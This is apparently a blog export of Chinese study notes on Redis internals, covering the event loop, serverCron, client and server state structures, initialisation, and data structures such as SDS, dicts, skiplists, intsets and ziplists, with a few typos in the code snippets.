如果返回的为一个非 AE_NOMORE 的整数值，那么这个事件就是周期事件，到达之后，会更新其when。 目前，Redis只有周期事件 实现所有的时间事件都被放入了一个无序链表中，每当时间事件执行器运行时，它会遍历整个链表，查找已到达的事件，并调用相应的事件处理器 注意：因为是头插入法，所以链表的ID为逆序，而且这个的无序说的是没有按when属性排序，它必须遍历所有 为什么无序链表不会影响性能？ 因为Redis只有 serverCron 一个时间事件，而在 benchmark 模式下，也只有两个时间事件。这种情况下，无序链表就相当于一个指针 serverCron 函数的主要工作是什么？ 更新服务器的各类统计信息，比如：时间、内存占用、数据库占用情况等 清空过期的键值对 关闭和清理连接失效的客户端 尝试进行 AOF 或 RDB 持久化 如果服务器为主服务器，负责对从服务器进行定期同步 如果处于集群模式，对集群进行定期同步和连接测试 一般为每秒运行10次，当然也可更改配置文件 事件的调度与执行何时处理文件事件，何时处理时间事件，由aeProcessEvents函数实现 伪代码实现： def aeProcessEvents(): # 距离当前时间最近的时间事件 time_event=aeSearchNearestTimer() # 距离当前事件还有多少时间 remaind_ms=time_event.when-unix_ts_now() if remaind_ms&lt;0: remaind_ms=0 # timeval 有个上限的 timeval=Create_timeval_with_ms(remaind_ms) # 阻塞，等待文件事件产生 # 如果timeval为0。就不阻塞 aeApiPoll(timeval) processFileEvents() processTimeEvents() 并且aeProcessEvents函数置于一个循环里面 def main(): # 初始化服务器 init_server() # z while server_is_not_shutdown(): aeProcessEvents() clean_server() 事件的调度和执行规则： aeApiPoll 函数的最大阻塞事件由最近的时间事件决定，避免了忙等待，也确保 aeApiPoll函数不会阻塞过长事件 因为文件事件肯定是随机出现的（连接、请求、回复），如果处理完文件事件后，时间事件还未到达，那么会进行下一次轮询，时间事件就会逐渐逼近 对文件事件和时间事件的处理都是同步、有序、原子地执行的，服务器不会中途中断事件处理，也不会对事件进行抢占，因此，各自的处理器都要尽可能地减少程序地阻塞时间，并在有需要时主动让出执行权。比如：在命令回复处理器中，当写入的字节数超过了预设常量的话，其处理器就会主动 break 跳出写入循环，将余下的数据留到下次再写；再比如，较为耗时的持久化操作，也是使用子线程或子进程执行的 时间事件会比文件事件晚执行，那么时间事件的实际处理时间会比设定的时间晚一些 客户端Redis的一个服务器可以与多个客户端建立网络连接 通过使用IO多路复用技术实现的文件时间处理器，Redis服务器使用单线程单进程的方式来处理命令请求，并与多个客户端进行网络通信 对于每个客户端，都使用 redis.h/redisClient 结构保存了客户端的状态，其中包含： 客户端的套接字描述符 客户端的name 客户端的标志值（flag） 指向客户端正在使用的数据库的指针，以及该数据库的号码 客户端当前要执行的命令、命令的参数、参数的个数，以及指向命令实现函数的指针 客户端的输入缓冲区和输出缓冲区 客户端的复制状态信息，以及进行复制所需的数据结构 客户端执行 BRPOP、BLPOP 等列表阻塞命令时使用的数据结构 客户端的事务状态，以及状态 WATCH 命令时用到的数据结构 客户端执行发布与订阅功能时用到的数据结构 客户端的身份验证标志 客户端的创建时间，与服务器最后一次通信的时间，以及客户端的输出缓冲区大小超出软性限制（soft limit）的时间 对于服务器而言，clients 属性就是一个链表 struct redisServer{ //... list *clients; //... }; 客户端属性客户端的属性大致可以分为两类： 比较通用的属性：很少与特定功能相关，无论客户端执行什么工作，都会用到这类属性 与特定功能相关的属性：比如操作数据库时需要用到的db属性和ditcid属性，执行事务时需要用到的matate属性 套接字描述符 typedef struct redisClient{ // ... int fd; // ... }redisClient; 根据客户端类型的不同，fd属性的值可以为-1，或者是大于-1的整数 伪客户端（fake client）：fd为-1，其请求来源于 AOF 脚本 或 Lur 脚本，而不是网络，所以这种客户端是不需要套接字连接的，自然也就不许要套接字描述符 普通客户端：fd&gt;-1，记录客户端套接字的描述符 名字 默认情况下，一个连接到服务器的客户端是没有name的 127.0.0.1:6379&gt; CLIENT list id=4 addr=127.0.0.1:51168 fd=7 name= 使用 CLIENT setname 可以为客户端设置一个名字，让客户端的身份变得更加的清晰 127.0.0.1:6379&gt; CLIENT setname as OK 127.0.0.1:6379&gt; CLIENT list id=4 addr=127.0.0.1:51168 fd=7 name=as 在代码中，name为一个结构体指针 typedef struct redisClient{ // ... robj *name; // 字符串对象 // ... }redisClient; 标志 客户端的标志属性（flags）记录了客户端的角色（role），以及客户端目前所处的状态 typedef struct redisClient{ //... int flags; //... }redisClient; 表示角色的： REDIS_MASTER：主服务器，因为在主从同步时，主服务器就像从服务器的客户端 REDIS_SLAVE：从服务器 REDIS_PRE_PSYNC：表示一个低于 Redis 2.8 的从服务器，主服务器不能使用 PSYNC 命令与这个从服务器进行同步 REDIS_LUA_CLIENT：表示客户端是专门用于处理 Lua 脚本里面包含的 Redis 命令的伪客户端 标志状态的： REDIS_MONITOR：表示客户端正在执行 MONITOR 命令 REDIS_UNIX_SOCKET：表示服务器使用UNIX套接字来连接客户端 REDIS_BLOCKEN：客户端正在被 BRPOP、BLPOP 等命令阻塞 REDIS_UNBLOCKEN：客户端已经从 REDIS_BLOCKED 标志所表示的阻塞状态中脱离出来，不再阻塞 REDIS_MULTI：表示客户端正在执行事务 REDIS_DIRTY_CAS：表示事务使用WATCH 命令监视的数据库键已经被修改； REDIS_DIRTY_EXEC表示命令入队时出现了错误，这两个标志都表示事务的安全性已经被破坏，只要任意一个被打开，EXEC命令必定会执行失败。注意，这两个标志只能在 Redis 客户端打开了 REDIS_MULTI 标志的情况下使用 REDIS_CLOSE_ASAP：表示客户端的输出缓冲区大小超出了服务器允许的范围。服务器会在下一次serverCron时关闭这个客户端，以免其影响性能，而积累在缓冲区的所以内容都会被释放掉 REDIS_CLOSE_AFTER_REPLY：表示有用户对这个客户端执行了 CLIENT KILL 命令，或者客户端发送给服务器的命令请求中包含了错误的协议内容。服务器会将输出缓冲区的内容发送给客户端，然后关闭客户端 REDIS_ASKING：客户端向集群节点发送了 ASKING 命令 REDIS_FORCE_AOF：标识强制服务器将当前执行的命令写入到 AOF 文件里面 REDIS_FORCE_REPL 标识强制主服务器将当前执行的命令复制给所有从服务器 执行 PUBSUB 命令会使客户端打开 REDIS_FORCE_AOF，执行 SCRIPT LOAD 命令会使客户端打开 REDIS_FORCE_AOF 标志和 REDIS_FORCE_REPL 标志 在主从服务器进行命令传播期间，从服务器需要向主服务器发送 REPLICATION ACK命令，在这个命令发送之前，从服务器需要主服务器打开对应客户端状态的 REDIS_MASTER 输入缓冲区 用于保存客户端发送的命令请求 typedef struct redisClient{ //... sds querybuf; //... }redisClient; 输入缓冲区的大小会根据输入内容动态的缩小或扩大，其最大大小不能超过1GB，否则将会关闭这个客户端 命令和命令参数 服务器对命令请求的内容进行分析，得出命令参数和命令参数个数保存到客户端状态的 argv属性和argc属性 typedef struct redisClient{ // ... robj **argv; int argc; // ... }redisClient; argv为一个数组，每一项都是字符串，其中 argv[0] 为要执行的命令 argc为argv的长度 命令实现的函数 对应命令的函数，使用一个dict实现的，一个k对应其一个redisCommand结构，它保存了命令的实现函数、命令的标志、给定的参数个数、总执行次数和总消耗时长等统计信息 typedef struct redisClient{ // ... struct redisCommand *cmd; // ... }redisClient; 输出缓冲区 执行命令回复都会被保存在客户端状态的输出缓冲区里面，每个客户端都有两个输出缓冲区可用，一个大小固定的，另一个大小可变 固定大小的缓冲区用于保存那些长度比较小的回复，比如 OK、简短的字符串、错误回复等 可变的缓冲大多用于保存那些长度比较大的回复,如较长的列表回复等 固定缓冲区由 buf 和 bufpos 两个属性组成： typedef struct redisClient{ // ... // REDIS_REPLY_CHUNK_BYTES 默认值为 16*1024，即 16KB // 如 buf=\"+OK\\r\\n\" bufpos=5 char buf[REDIS_REPLY_CHUNK_BYTES]; int bufpos; // ... }redisClient; buf 为一个大小为 REDIS_REPLY_CHUNK_BYTES 字节的字节数组，而 bufpos 属性则记录了 buf 数组目前已使用的字节数量 可变大小缓冲区由 reply 链表和一个或多个字符串对象组成： typedef struct redisClient{ // ... list *reply; // ... }redisClient; 而链表是用来连接多个字符串对象的，服务器就可以为客户端保存一个非常长的命令回复，不限于 16KB 身份验证 客户端状态的authenticated用于记录客户端是否通过身份验证 typedef struct redisClient{ // ... // 0 为未通过；1 为通过 int authenticated; // ... }redisClient; 时间 typedef struct redisClient{ // ... // 创建客户端的时间，可用来记录客户端与服务器已经连接了多少秒 // 如： CLIENT list 返回的 age中，就用了这个属性 time_t ctime; // 最后一次与客户端互动的时间，用来计算空转的时间 // 如：idle time_t lastinteration; // 输出缓冲区第一次到达软性限制的时间 time_t obuf_soft_limit_reached_time; // ... }redisClient; 服务器对客户端输出缓冲区的两种限制： 硬性限制（hard limit）：如果输出缓冲区的大小超过了硬性限制所设置的大小，那么服务器就会立即关闭客户端 软性限制（soft limit）：如果输出缓冲区的大小超过了软性限制所设置的大小，但还没超过硬性限制的，那么服务器使用服务器状态的 obuf_soft_limit_reached_time 记录当前时间，如果客户端在一段时间内，一直超出软性限制，那么就会关闭客户端连接；反之就将记录的时间清零 如何设置软性限制和硬性限制？ 使用 client-output-buffer-limit 选项，可为普通客户端、从服务器客户端、执行发布和订阅功能的客户端分别设置不同的软性限制和硬性限制 语法：client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt; 如： # 普通客户端，软硬都为0，不限客户端的输出缓冲区大小 client-output-buffer-limit normal 0 0 0 # 从服务器客户端，软为256mb，硬为64mb，软性限制时长为60s client-output-buffer-limit slave 256mb 64mb 60 # 执行发布和订阅功能的客户端，硬为32mb，软为8mb，60s client-output-buffer-limit pubsub 32mb 8mb 60 两个伪客户端Lua脚本的伪客户端 redis初始化时，创建负责执行 Lua 脚本中包含的 Redis 命令的伪命令，并将这个伪客户端关联在服务器状态结构的 lua_client 属性中 struct redisServer{ // ... redisClient *lua_client; // ... }; 这个伪客户端会一直存在，直到服务器关闭 AOF 文件的伪客户端 其fd为-1，AOF 载入完毕后就会关闭 服务器服务器负责与多个客户端建立网络连接，处理客户端发送的命令请求，在数据库中保存客户端执行命令所产生的数据，并管理资源来维护自身的运转 命令请求的执行过程一个命令请求从发送到回复的过程 发送命令请求：客户端将用户输入的命令请求转换为协议格式，然后通过连接到服务器的套接字，将协议格式的请求发送给服务器 如：SET KEY VALUE 转化为*3\\r\\n$3\\r\\nSET\\r\\n$3\\r\\nKEY\\r\\n$5\\r\\nVALUE\\r\\n 读取命令请求：服务器与客户端之间连接的套接字因为客户端的写入变得可读，然后执行如下操作： 读取套接字协议格式的命令请求，并将其保存到客户端状态的输入缓冲区里 对输入缓冲区里的命令进行解析，提取出 agrv和argc 调用命令执行器，执行指定命令 当然，执行前则是根据redisCommand调用 命令执行时，会有一系列的预备操作，如内存占用、是否身份验证、cmd指针是否指向 NULL等， 执行后续工作，如：服务器开启慢查询日志功能时，是否需要将其添加进慢查询日志；根据刚刚执行命令所耗费的时长，更新redisCommand结构的milliisecods 属性，并将其 calls计数器+1；写入AOF缓冲区（开启了 AOF 持久化功能的情况下）；传至从服务器（如果从服务器正在复制） 将命令回复发送给客户端 命令实现函数将命令回复保存到客户端的输出缓冲区中，并为客户端套接字关联命令回复处理器，当客户端套接字变得可写时，服务器就会执行命令回复处理器，将保存在客户端输出缓冲区中的命令回复发送给客户端。发送完后，清空缓冲区，为下一个做准备 客户端接受并打印命令回复 serverCron函数 默认每 100ms执行一次，负责管理服务器的资源 更新服务器时间缓存 因为有不少功能都需要获取到系统的当前时间，而每次获取都会涉及到系统调用，为了减少调用次数，redis在服务器状态中设置了unixtime 属性和mstime属性当作当前时间的缓存 struct redisServer{ //... // 秒精度 time_t unixtime; // 毫秒精度 long long mstime; //... } 默认每100ms会更新这两个属性，所有其精度不会很高 什么时候需要使用缓存时间？ 打印日志、更新服务器的LRU时钟、决定是否执行持久化任务、计算服务器上线时间（uptime）这类对时间精度要求不高的功能上 什么时候还是得执行系统调用？ 为键设置过期时间、添加慢查询日志等需要高精度的时间功能来说 更新LRU时钟 保存着服务器的LRU时钟 struct redisServer{ // ... // 默认每10s更新一次的时钟缓存 // 用于计算键的空转（idle）时长 unsigned lruclock:22; // ... }; 每个 redisObject 都会保存一个 lru属性，这个属性保存了对象最后一次被命令访问的时间 typedef struct redisObject{ // ... unsigned lru:22; // ... }robj; 当服务器要计算一个数据库键的空转时间时，程序会用服务器的lruclock属性记录的时间减去对象的lru记录的时间 redis&gt; OBJECT IDLETIME msg (integer) 20 更新服务器每秒执行命令次数 serverCron 函数中的 trackOperationPerSecond 会以每 100ms 一次的执行，这个函数的功能是以抽样计算的方式，估算并记录服务器在最近一秒处理的命令请求数量。 redis&gt; INFO stats # Stats ... instantaneous_ops_per_sec:6 ... 可以使用 INFO status 查看，其 instantaneous_ops_per_sec 域就是对应的 trackOperationPerSecond 函数跟服务器状态中的四个 ops_sec_开头的属性都有关： struct redisServer{ // ... // 上次抽样时间 long long ops_sec_last_sample_time; // 上次抽象时，服务器已执行命令的数量 long long ops_sec_last_sample_ops; // REDIS_OPS_SEC_SAMPLES 大小（默认值16）的环形数组， // 数组中的每个项都记录了一次抽象结果 long long ops_sec_samples[REDIS_OPS_SEC_SAMPLES]; // ops_sec_samples 数组的索引值， // 每次抽样后将值自增1 // 在值等于16时重置为0 // 让 ops_sec_samples 数组构成一个环形数组 int ops_sec_idx; // ... } trackOperationPerSecond 函数每次运行，都会根据 ops_sec_last_sample_time 记录的上一次抽样时间和服务器的当前时间，以及上次执行的命令数量和当前已执行的命令数量，计算出两次trackOperationPerSecond 函数调用之间，平均每ms处理了多少个请求，然后再将该值乘以1000，就得到了服务器每s处理了多少个请求的估计值，然后放入 ops_sec_samples 数组里 伪代码实现 getOperationsPerSecond 函数,，其值对应为 instantaneous_ops_per_sec： long long getOperationsPerSecond(void){ int j; long long sum = 0; // 计算所有取样值的总和 for(j=0;j&lt;REDIS_OPS_SEC_SAMPLES;j++){ sum+=server.ops_sec_samples[j]; } // 计算取样的平均值 return sum/RESID_OPS_SEC_SAMPLES; } 更新服务器内存峰值记录 每次执行 serverCron 函数时，都会查看服务器当前使用的内存数量，并与以前的比较，取max struct redisServer{ //... // 已使用的内存峰值 size_t stat_peak_memory; //... }; INFO memory的两个状态记录着内存的峰值 redis&gt; INFO memory # MEMORY ... used_memory_peak:689464 used_memory_peak_human:673.30K ... 处理 SIGTERM 信号 启动服务器时，服务器进程的 SIGTERM 信号关联处理器 sigtermHandler 函数，这个函数负责在服务器接到 SIGTERM 信号时，打开服务器状态的 shutdown_asap 标识 static void sigtermHandler(int sig){ // 打印日志 redisLogFromHandler(REDIS_WARNING,\"Received SIGTERM, scheduling shutdown...\"); // 打开关闭标识 server.shutdown_asap=1; } 每次serverCron 函数运行时，程序都会对服务器状态的 shutdown_asap 属性进行检查，并根据其值决定是否关闭服务器 struct redisServer{ // ... // 关闭服务器标识 int shutdown_asap; // ... } 并且在关闭前，需要 DB saved on dist 管理客户端资源 serverCron 函数还会调用 clientsCron 函数，clientsCron 函数会对一定数量的客户端进行下面两个查询： 如果客户端与服务器之间的连接已经超时（很长一段时间没有互动），那么就会释放这个客户端 如果客户端上一次执行命令请求之后，输入缓冲区的大小超过了一定的长度，那么程序就会释放客户端当前的输入缓冲区，并重新创建一个默认大小的输入缓冲区，从而防止客户端的输入缓冲区耗费了过多的内存 管理数据库资源 定期删除 执行被延迟的 BGREWRITEAOF 在服务器执行 BGSAVE 命令的期间，如果客户端向服务器发来 BGREWRITEAOF 命令，那么其命令就会等到BGSAVE 命令执行完毕后再执行 struct redisServer{ //... // 如果值为1，则表示有 BGREWRITEAOF 命令被延迟 int aof_rewrite_scheduled; //... }; 每次 serverCron 时，都会判断当前 BGSAVE 或者 BGREWRITEAOF 命令是否执行，若没，则判断 aof_rewrite_scheduled 的值 检查持久化操作的运行状态 记录 BGSAVE命令和 BGREWRITEAOF命令的子进程ID，用于检查其是否正在执行 struct redisServer{ // ... // 记录执行 BGSAVE命令子进程的ID // 如果服务器没有执行这个子进程，其值为-1 pid_t rdb_child_pid; // 记录 BGREWRITEAOF命令子进程的ID pid_t aof_child_pid; }; 每次执行 serverCron 函数时，会检查 rdb_child_pid 和 aof_child_pid 两个属性的值。 若其中一个不为-1，则执行 wait3 函数，检查子进程是否有信号发来服务器进程： 如果有，证明 RDB 文件或者 AOF 文件已经新生成，需要进行后续操作，如替换老文件等 如果没有，就表明未完成，不做处理 若两个都不为-1，则表明服务器没有在进行持久化操作，那么就会做下面三个检查： 查看是否有 BGREWRITEAOF 被延迟了，如果有就执行 检查服务器自动保存条件是否满足，如果满足，并没有执行其它持久化操作（因为上一个检查中，可能会执行 BGREWRITEAOF，所以这里会再检查一次），那么就会开始一次新的 BGSAVE 操作 检查服务器设置的AOF重写条件是否满足。如果满足，并没有执行其它持久化操作，就会执行一次新的 BGREWRITEAOF 操作 将AOF缓冲区中的内容写入AOF文件 关闭异步客户端 关闭输出缓冲区超出大小限制的客户端 增加 cronloops 计数器的值 struct redisServer{ // ... // 记录 serverCron 函数的运行次数计数器 int cronloops; // ... }; 其作用为复制模块的每N次就执行一次指定代码 初始化服务器一个服务器从启动到能接受客户端端命令请求的过程 初始化服务器状态结构void initServerConfig(void){ // 设置服务器的运行id getRandomHexchars(server.runid,REDIS_RUN_ID_SIZE); // 为运行id加上结尾字符 server.runid[REDIS_RUN_ID_SIZE]='\\0'; // 设置默认配置文件路径 server.configfile=NULL; // 设置默认服务器频率 server.hz=REDIS_DEFAULT_HZ; // 设置服务器的运行架构 server.arch_bits=(sizeof(long)==8)?64:32; // 设置默认服务器端口号 server.port=REDIS_SERVERPORT; //... } initServerConfig 函数的主要工作： 设置服务器运行的ID 设置服务器的默认运行频率 设置默认配置文件 设置运行架构 设置默认端口号 设置默认RDB持久化条件和AOF持久化条件 初始化服务器的LRU时钟 创建命令表 initServerConfig函数设置的服务器状态属性基本都是一些整数、浮点数、或者字符串等属性，除命令表外，该函数没有创建服务器状态的其他数据结构，数据库、慢查询日志、Lua环境、共享对象等 载入配置选项在启动服务器时，用户可以通过配置参数或者指定配置文件来修改服务器的默认配置 如： $ redis-server --port 10086 载入配置文件 # 服务器的数据库数量设置为 32 个 database 32 # 关闭 RDB 文件压缩功能 rdbcompression no $ redis-server redis.conf initServerConfig 函数初始化完 server变量后，就会载入用户给定的配置参数和配置文件，并对相关属性进行修改 初始化服务器数据结构除了命令表，服务器状态还包含了其他数据结构，如： server.clients 链表：记录所有与服务器连接的客户端状态 server.db 数组：所有数据库 server.pubsub_channels 字典：频道的订阅信息 server.pubsub_patterns 链表：模式订阅信息 server.lua：用于执行 Lua 脚本的Lua环境 server.slowlog：保存慢查询日志的属性 配置好这些后，服务器又会调用 initServer 函数，为以上数据分配内存，并在有需要时进行数据结构设置或关联初始值 initServerConfig 函数主要负责初始化一般属性，initServer 负责数据结构 initServer 除了数据结构之外，还包括以下操作： 为服务器设置进程信号处理器 创建共享对象：如 “OK”和”ERR”等回复的字符串对象，整数1~10000的字符串对象等 打开服务器监听端口，并为监听套接字关联连接应答事件处理器 为serverCron 函数创建事件时间 如果AOF持续化开启，则打开AOF文件，没有就创建一个新的 初始化服务器后台的IO模块 initServer 函数执行完毕后，就会在终端打印出 Redis 图标和版本信息等 还原数据库状态完成了对服务器状态的初始化后，根据需要载入的 RDB 文件或AOF 文件，还原数据库状态 载入完毕后，会打印 “DB loaded from disk: 0.068 seconds” 执行事件循环初始化最后一步，打印出 “The server is now ready” 并开始执行事件循环（loop） 至此服务器的初始化就算完成","categories":[{"name":"redis","slug":"redis","permalink":"https://github.com/z-anshun/categories/redis/"}],"tags":[{"name":"books","slug":"books","permalink":"https://github.com/z-anshun/tags/books/"},{"name":"redis设计与实现","slug":"redis设计与实现","permalink":"https://github.com/z-anshun/tags/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"}]},{"title":"底层结构","slug":"底层结构","date":"2022-03-28T11:12:12.000Z","updated":"2022-03-28T11:12:48.378Z","comments":true,"path":"2022/03/28/di-ceng-jie-gou/","link":"","permalink":"https://github.com/z-anshun/2022/03/28/di-ceng-jie-gou/","excerpt":"","text":"动态字符串SDS（simple dynamic string），简单动态字符串 struct sdshdr{ int len; // 当前的长度 int free;// 可使用的空间 char buf[];// } 注意：SDS遵循C字符串以空字符结尾的惯例，即\\0,所以在len里面没算上这个char，对用户来说是透明的。好处是重用C的函数 为什么不跟C一样，直接存储字符串？ 获取字符串长度的时间复杂度为O(1)，便于STRLEN等命令 杜绝缓冲区溢出，比如：在调用strcat(char *dest,const char *src)时，导致拼接的遍历过长，覆盖到其它变量 减少内存重新分配的次数 惰性空间释放 二进制安全（binary-safe），使用二进制存储，len判断何时终止，以致于存什么，拿出来就是什么 C函数的重用strcasecmp 链表typedef struct listNode{ struct listNode *pre; struct listNode *next; void *value; } typedef struct list{ listNode *head; listNode *tail; unsigned long len;// 长度 void *(*dup)(void *ptr); //节点复制函数 void (*free)(void *ptr); int (*match)(void *ptr,void *key); }list; 字典哈希表typedef struct dictht{ dictEntry **table; unsigned long size; // 大小 unsigned long sizemask; // 索引值，等于size-1 unsigned long used; }dictht; typedef struct dictEntry{ void *key; union{ void *val; uint64 _tu64; int64 _ts64; }v; struct dictEntry *next; // 指向下一个节点，用来解决哈希冲突 }dictEntry; 字典typedef struct dict{ // 特定的类型,指向 dictType 结构的指针 dictType *type; // 私有数据，保存需要传给哪些类型特定函数的可选参数 void *privdata; // hash 表 dictht ht[2]; // rehash 索引 int rehashidx; }dict; typedef struct dictType{ // 计算对应的哈希值 unsigned int (*hashFunction)(const void *key); // 复制键 void *(*keyDup)(void *privdata,const void *key); // 复制值 void *(*valDup)(void *privdata,const void *obj); // 对比键 void (*keyCompare)(void *privdata,const void *key1,const void *key2); // 销毁键 void (*keyDestructor)(void *privdata,void *key); // 销毁值 void (*valDestructor)(void *privdata,void *obj); }dictType; 将k0和v0添加到字典里面： // 计算出k0的哈希值 hash = dict-&gt;type-&gt;hashFunction(k0); // 假设当前的hash值为0 index = hash&amp;dict-&gt;ht[0].sizemask // 8&amp;3 = 0; 注意：redis的hash冲突是使用链地址法来解决的，并且使用头插入法（因为没有记录链表尾节点，使其时间复杂度为O(1)） 何时扩容？ 服务器目前没有执行 BGSAVE 或者 BGREWRITEAOF 命令，并且哈希表的负载因子大于等于1 服务器正在执行 BGSAVE 或者 BGREWRITEAOF 命令，并且哈希表的负载因子&gt;=5 // 负载因子=哈希表已保存节点数量/哈希表大小 load_factor=ht[0].used / ht[0].size; 何时执行移动？ 每一次操作，和定时。并且，新写入的kv，只会在ht[1]中 为什么在执行时的要大于等于5? 因为在执行 BGSAVE 或者 BGREWRITEAOF 命令时，Redis需要创建子进程，而大多数操作系统都是使用的COW（copy-on-write）技术来优化子程序的使用效率，所以在子程序执行期间，应尽量避免扩展，避免不必要的内存写入操作，最大限度地节约内存 rehash 渐进式hash的过程如何？ ht[1]分配空间，使其 2^n&gt;ht[0].size （这里的2^n 为ht[1]的空间大小） 在dict中维护一个rehashidx变量，设置为0，表示开始 在rehash期间，除了对字典执行指定操作外，还有将rehashidx索引上在ht[0]对应的键值对移向ht[1]然后rehashidx++ 所有移动完后，rehashidx=-1，并将dict-&gt;ht[0]=dict-&gt;ht[1] 为什么扩容时为2的次方？ 使sizemark为2^n-1，与它求并集代替求余，使其效率更高 跳表skiplist zskiplist: header：跳跃表的表头节点 tail：尾节点 level：当前层数最大的那个节点的层数 length：跳跃表包含节点的数量 zskiplistNode: 层（level）：节点中L1、L2、L3等字样标记节点的各个层，每层带有两个属性： 前进指针：访问下一个节点 跨度：上图中带有箭头指针上的数字 后退（backwark）指针：图中的BW 分值（score）：对应的值 成员对象（obj）：图中的o1、o2、o3，表示对象 跳表节点typedef struct zskiplistNode{ // 层 struct zskiplistLevel{ // 前进指针 struct zskiplistNode * forward; // 当前跨度 unsigned int span; } level[]; // 后退指针 struct zskiplistNode *backward; // 分值 double score; // 成员对象 robj *obj; }zskiplistNode; 层：每次创建节点时，根据幂次定律（power law，某件事的发生频率和它的某个属性成幂关系，即越大的出现概率越小）随机生成一个level大小（1~32） 前近指针 跨度：记录两个节点之间的距离，如果下一个为NULL，其值就为0。其还有一个作用，用来计算rank（排名），在查找某个节点的过程中，将跨度累计起来，就是目标节点在跳跃表中的排位 后退指针：可实现从表尾至表头的遍历 分值和成员：分值为 double，成员为一个SDS的字符串 跳跃表管理多个跳跃节点 typedef struct zskiplist{ // 表头和表尾节点 struct zskiplistNode *header,*tail; // 表中节点的数量 unsigned long length; // 表中层数最大的节点的层数 int level; }zskiplist 整数集合typedef struct intset{ // 编码方式 uint32_t encoding; // 该集合包含的元素数量 uint32_t length; // 保存元素的数量 int8_t contents[]; }intset; 注意：contents中的元素并不一定是int8_t，需要根据encoding来判断 升级 升级整数集合并添加新元素： 根据新元素类型，扩展整数集合底层数组的空间大小，并为其分配新空间 将底层数组现有的元素都转换成与新元素相同的类型，并按原位放置 将新元素添加 注意：因为要触发升级，就证明当前的类型不足以满足新值，那么一定是更小、或者更大的，这就导致新元素要么在content的第一个或者最后一个 升级的好处在于 提升整数集合的灵活性格 和 尽可能地节约内存 提升灵活性：因为能自动升级，那么也就能避免错误，使其用法更加灵活 一开始使用 int16_t 类型，等遇到了 int32_t 和 int64_t 时，再进行升级，就能尽可能的节约内存 注意：整数集合并不支持降级的操作，一旦对数组进行了升级，那么编码就会一直保持升级的状态 压缩列表ziplist，是列表键和哈希键的底层实现之一。 当一个列表 键只包含少量列表项，并且每个列表项要么是小整数，要么就是长度比较短的字符串，那么 Redis 就会使用压缩列表来做列表键的底层实现 如： redis&gt; RPUSH lst 1 3 5 10086 \"hello\" \"world\" (integer)6 redis&gt; OBJECT ENCODING lst \"ziplist\" 另外，当一个哈希键只包含少量键值对，并且每个键值对的键和值要么为小整数值，或者比较短的字符串，那么 Redis 也会使用压缩列表来做哈希键的实现 redis&gt; HMSET profile \"name\" \"Jack\" \"age\" 28 \"job\" \"Programmer\" OK redis&gt; OBJECT ENCODING profile \"ziplist\" 压缩列表的构成压缩列表是为了节约redis内存而开发的，由一系列特殊编码的连续内存块组成的顺序型（sequential）数据结构。 一个压缩列表可以包含任意多个节点（entry），每个节点可以保存一个字节数组或者一个整数值 zlbytes：uint32_t 类型，4 字节，记录整个压缩列表占用的内存字节数；在对压缩列表进行重新内存分配，或者计算 zlend 的位置时使用 zltial：uint32_t 类型，4字节，记录压缩列表表尾节点距离压缩列表的起始地址有多少个字节；通过这个变量，程序无需遍历，直接找到表尾节点的地址（这里的起始指的整个列表的开始位置，即zlbytes的地址） zllen：uint16_t 类型，2字节，记录压缩列表包含的节点数量（注意：当这个属于小于 UINT16_MAX，也就是65535 的 时候，这个属性就是这个列表包含节点的数量，反之，大于时，就需要遍历才能知道真实的节点数量） extryX：列表节点，长度由列表节点自己定 zlend：uint8_t类型，特殊值 0xFF（255）,用于标记压缩列表的末端 压缩节点 previous_entry_length：表示前一个节点的长度，当前一个节点小于254长度时，该属性占用1字节，当大于254，该属性会占用5个字节，第一个字节设置为254，后面4个字节再表示长度 encoding：记录节点的content属性所保存数据的类型以及长度。类型使用一个字节长度表示，以11开头，长度由1、2、或5字节长度表示，即当前字节数组的长度 ​ 如：00001011，则表示这是一个字节数组，长度为1011，即11长度，content就可为“hello world” ​ 如：11000000，则表示一个int16_t的整数类型，content就可以为 10086。 content：保存节点的值，节点值可以是一个字节数组或者整数，值的类型和长度，由节点的encode属性决定 连锁更新当某个节点的entry为250~253字节时，后面一个节点的previous_entry_length就只占一个字节，但，当前面插入一个大于254字节的时候，这时候，这个节点的previous_entry_length就需要改成5个字节，即使大于了254，那么后面一个节点也需要改变 最坏情况下，需要N次分配，每次空间重新分配都需要 O(n)，那么时间复杂度就为O(n^2) 但是这种多个连续节点在250~253字节的情况并不多见，而且，只要被更新的节点数不多，也不会对性能造成什么影响 因此，ziplistPush 等命令的平均复杂度还是O(n) 对象在 Redis 中用对象来表示数据库中的键和值，每当创建一个键值对时，都会至少创建2个对象 如 redis&gt; SET msg \"hello world\" OK 就会存储2个对象，一个包含了字符串值“msg”的对象，另一个包含了字符串值“hello world”的对象 而Redis中每一个对象都由 redisObject 结构表示 typedef struct redisObject { // 类型 unsigned type:4; // 强制占4位 // 编码 unsigned encoding:4; // 指向底层实现数据结构的指针 void *ptr; //... }robj; 类型 虽然对于 Redis 的键值对来说，键总是一个字符串对象，但值可以是一个字符串对象、列表对象、哈希对象、集合对象或者有序集合对象 因此，当我们使用 type 命令时，命令返回的结果为值对应的对象 redis&gt; TYEP msg string 编码和底层实现 对象的ptr指针指向对象的底层实现数据结构，而这些属性都是由对象的encoding属性决定的 encoding所包含的属性有 long类型的整数、embstr 编码的简单动态字符串、简单动态字符串、字典、双端链表、压缩列表、整数集合、跳跃表和字典 并且每种类型的对象至少使用了两种不同的编码 使用 OBJECT ENCODING可以查看值对象的编码 redis&gt; OBJECT ENCODING msg \"emstr\" redis&gt; SET story \"long long long long long long ago...\" OK reids&gt; OBJECT ENCODING story \"raw\" 使用 encoding 属性，能够极大的提高 Redis 的灵活性和效率，根据不同场景来为同一个对象设置不同的编码，从而优化对象在某一场景下的效率 比如：在列表元素较少时，使用压缩列表作为列表对象的底层实现 字符串对象字符串对象可以是 int、raw或者emstr 如果一个字符串对象保存的为整数值，并且这个值可以使用long类型来表示，那么字符串对象的编码设置为int 如： redis&gt; SET number 10086 OK redis&gt; OBJECT ENCODING number \"int\" 如果保存的是一个字符值，并且这个字符值的长度大于32字节，那么就会使用一个SDS来保存，并将对象的编码设置为raw redis&gt; SET story \"Long, long ago there lived a king...\" OK redis&gt; STRLEN story (integer) 37 redis&gt; OBJECT ENCODING story \"raw\" 如果保存对象是一个字符串值，并且长度小于等于32字节，那么将会使用embstr 编码的方式来保存 